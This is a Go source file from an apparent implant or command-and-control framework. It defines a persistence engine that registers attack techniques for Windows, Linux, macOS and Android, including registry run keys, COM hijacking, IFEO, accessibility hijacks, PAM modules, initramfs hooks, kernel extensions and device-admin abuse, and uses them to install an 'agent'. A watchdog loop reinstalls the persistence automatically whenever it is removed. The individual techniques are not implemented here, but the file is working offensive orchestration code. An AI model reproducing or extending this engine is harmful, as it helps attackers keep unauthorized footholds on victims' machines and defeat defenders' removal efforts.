package persistence

import (
	"fmt"
	"sync"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
	"github.com/angel-platform/angel/pkg/types"
)

type PersistenceEngine struct {
	config      *PersistenceConfig
	methods     map[PersistenceMethod]PersistenceMethodInterface
	mu          sync.RWMutex
	log         *logger.Logger
	platform    types.Platform
	installed   map[PersistenceMethod]*PersistenceResult
}

func NewPersistenceEngine(config *PersistenceConfig) *PersistenceEngine {
	if config == nil {
		config = DefaultPersistenceConfig()
	}

	e := &PersistenceEngine{
		config:    config,
		methods:   make(map[PersistenceMethod]PersistenceMethodInterface),
		log:       logger.New("persistence-engine", logger.LevelInfo),
		platform:  config.Platform,
		installed: make(map[PersistenceMethod]*PersistenceResult),
	}

	e.registerPlatformMethods()
	return e
}

func (e *PersistenceEngine) registerPlatformMethods() {
	switch e.platform {
	case types.PlatformWindows:
		e.registerWindowsMethods()
	case types.PlatformLinux:
		e.registerLinuxMethods()
	case types.PlatformDarwin:
		e.registerDarwinMethods()
	case types.PlatformAndroid:
		e.registerAndroidMethods()
	}
}

func (e *PersistenceEngine) registerWindowsMethods() {
	e.methods[MethodRegistryRun] = NewRegistryRunMethod()
	e.methods[MethodScheduledTask] = NewScheduledTaskMethod()
	e.methods[MethodServiceInstall] = NewServiceInstallMethod()
	e.methods[MethodWMIEvent] = NewWMIEventMethod()
	e.methods[MethodStartupFolder] = NewStartupFolderMethod()
	e.methods[MethodADS] = NewADSMethod()
	e.methods[MethodDLLSideload] = NewDLLSideloadMethod()
	e.methods[MethodCOMHijack] = NewCOMHijackMethod()
	e.methods[MethodAppInit] = NewAppInitMethod()
	e.methods[MethodIFEO] = NewIFEOMethod()
	e.methods[MethodAccessibility] = NewAccessibilityMethod()
}

func (e *PersistenceEngine) registerLinuxMethods() {
	e.methods[MethodCronJob] = NewLinuxCronJobMethod()
	e.methods[MethodSystemdService] = NewSystemdServiceMethod()
	e.methods[MethodRCLocal] = NewRCLocalMethod()
	e.methods[MethodProfileScript] = NewProfileScriptMethod()
	e.methods[MethodBashrc] = NewBashrcMethod()
	e.methods[MethodSSHKeys] = NewLinuxSSHKeysMethod()
	e.methods[MethodPAMModule] = NewPAMModuleMethod()
	e.methods[MethodUdevRule] = NewUdevRuleMethod()
	e.methods[MethodInitramfsHook] = NewInitramfsHookMethod()
}

func (e *PersistenceEngine) registerDarwinMethods() {
	e.methods[MethodLaunchDaemon] = NewLaunchDaemonMethod()
	e.methods[MethodLaunchAgent] = NewLaunchAgentMethod()
	e.methods[MethodDarwinCronJob] = NewDarwinCronJobMethod()
	e.methods[MethodDarwinSSHKeys] = NewDarwinSSHKeysMethod()
	e.methods[MethodLoginItem] = NewLoginItemMethod()
	e.methods[MethodKernelExtension] = NewKernelExtensionMethod()
}

func (e *PersistenceEngine) registerAndroidMethods() {
	e.methods[MethodMagiskModule] = NewMagiskModuleMethod()
	e.methods[MethodBootCompleted] = NewBootCompletedMethod()
	e.methods[MethodForegroundService] = NewForegroundServiceMethod()
	e.methods[MethodDeviceAdmin] = NewDeviceAdminMethod()
	e.methods[MethodAndroidAccessibility] = NewAndroidAccessibilityMethod()
}

func (e *PersistenceEngine) Install(method PersistenceMethod, params *PersistenceParams) (*PersistenceResult, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	m, ok := e.methods[method]
	if !ok {
		return nil, fmt.Errorf("unsupported persistence method: %s", method)
	}

	e.log.Info("Installing persistence via %s (platform: %s)", method, e.platform)

	params.Method = method
	if params.AgentPath == "" {
		params.AgentPath = e.config.AgentPath
	}
	if params.AgentArgs == "" {
		params.AgentArgs = e.config.AgentArgs
	}

	result, err := m.Install(params)
	if err != nil {
		e.log.Error("Failed to install persistence via %s: %v", method, err)
		return nil, fmt.Errorf("install failed: %w", err)
	}

	result.InstalledAt = time.Now()
	e.installed[method] = result

	e.log.Info("Persistence installed successfully via %s", method)
	return result, nil
}

func (e *PersistenceEngine) Remove(method PersistenceMethod, params *PersistenceParams) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	m, ok := e.methods[method]
	if !ok {
		return fmt.Errorf("unsupported persistence method: %s", method)
	}

	e.log.Info("Removing persistence via %s", method)

	params.Method = method
	if err := m.Remove(params); err != nil {
		e.log.Error("Failed to remove persistence via %s: %v", method, err)
		return fmt.Errorf("remove failed: %w", err)
	}

	delete(e.installed, method)
	e.log.Info("Persistence removed successfully via %s", method)
	return nil
}

func (e *PersistenceEngine) Verify(method PersistenceMethod) (bool, error) {
	e.mu.RLock()
	defer e.mu.RUnlock()

	m, ok := e.methods[method]
	if !ok {
		return false, fmt.Errorf("unsupported persistence method: %s", method)
	}

	params := &PersistenceParams{
		Method:    method,
		AgentPath: e.config.AgentPath,
	}

	return m.Verify(params)
}

func (e *PersistenceEngine) Watchdog(config *WatchdogConfig) error {
	if config == nil {
		config = DefaultWatchdogConfig()
	}

	e.log.Info("Starting watchdog with interval %v", config.Interval)

	ticker := time.NewTicker(config.Interval)
	defer ticker.Stop()

	for range ticker.C {
		for _, method := range config.Methods {
			ok, err := e.Verify(method)
			if err != nil {
				e.log.Error("Watchdog check failed for %s: %v", method, err)
				if config.OnFailure != nil {
					config.OnFailure(WatchdogEvent{
						Type:      "failure",
						Method:    method,
						Status:    "error",
						Timestamp: time.Now(),
						Details:   map[string]string{"error": err.Error()},
					})
				}
				continue
			}

			if !ok && config.AutoRepair {
				e.log.Warn("Persistence lost for %s, attempting repair", method)
				params := &PersistenceParams{
					Method:    method,
					AgentPath: e.config.AgentPath,
				}
				result, err := e.Install(method, params)
				if err != nil {
					e.log.Error("Auto-repair failed for %s: %v", method, err)
					if config.OnFailure != nil {
						config.OnFailure(WatchdogEvent{
							Type:      "repair_failed",
							Method:    method,
							Status:    "failed",
							Timestamp: time.Now(),
							Details:   map[string]string{"error": err.Error()},
						})
					}
					continue
				}
				if config.OnRepair != nil {
					config.OnRepair(WatchdogEvent{
						Type:      "repaired",
						Method:    method,
						Status:    "repaired",
						Timestamp: time.Now(),
						Details:   result.Details,
					})
				}
			}
		}
	}

	return nil
}

func (e *PersistenceEngine) GetAvailableMethods() []PersistenceMethod {
	e.mu.RLock()
	defer e.mu.RUnlock()

	methods := make([]PersistenceMethod, 0, len(e.methods))
	for m := range e.methods {
		methods = append(methods, m)
	}
	return methods
}

func (e *PersistenceEngine) GetInstalled() map[PersistenceMethod]*PersistenceResult {
	e.mu.RLock()
	defer e.mu.RUnlock()

	result := make(map[PersistenceMethod]*PersistenceResult)
	for k, v := range e.installed {
		result[k] = v
	}
	return result
}
